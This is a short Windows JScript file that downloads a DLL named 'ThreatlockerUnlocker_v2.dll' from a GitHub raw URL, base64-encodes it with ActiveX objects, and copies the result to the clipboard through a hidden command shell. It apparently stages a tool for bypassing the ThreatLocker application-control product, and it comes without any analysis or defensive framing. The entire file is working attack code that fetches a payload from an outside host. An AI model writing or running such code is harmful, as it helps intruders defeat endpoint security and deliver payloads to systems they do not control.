// Download DLL
var h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
h.Open("GET", "https://raw.githubusercontent.com/Lenard-Code/trash/main/ThreatlockerUnlocker_v2.dll", false);
h.Send();

// Convert to Base64
var stream = new ActiveXObject("ADODB.Stream");
stream.Type = 1;
stream.Open();
stream.Write(h.ResponseBody);
stream.Position = 0;
stream.Type = 2;
stream. Charset = "iso-8859-1";
var binaryString = stream.ReadText();
stream.Close();

// Base64 encode
var xml = new ActiveXObject("MSXML2.DOMDocument");
var node = xml.createElement("b64");
node.dataType = "bin.base64";
node.nodeTypedValue = h.ResponseBody;
var base64 = node.text. replace(/\s/g, '');

// Copy to clipboard
var shell = new ActiveXObject("WScript.Shell");
shell.Run("cmd /c echo " + base64 + " | clip", 0, true);
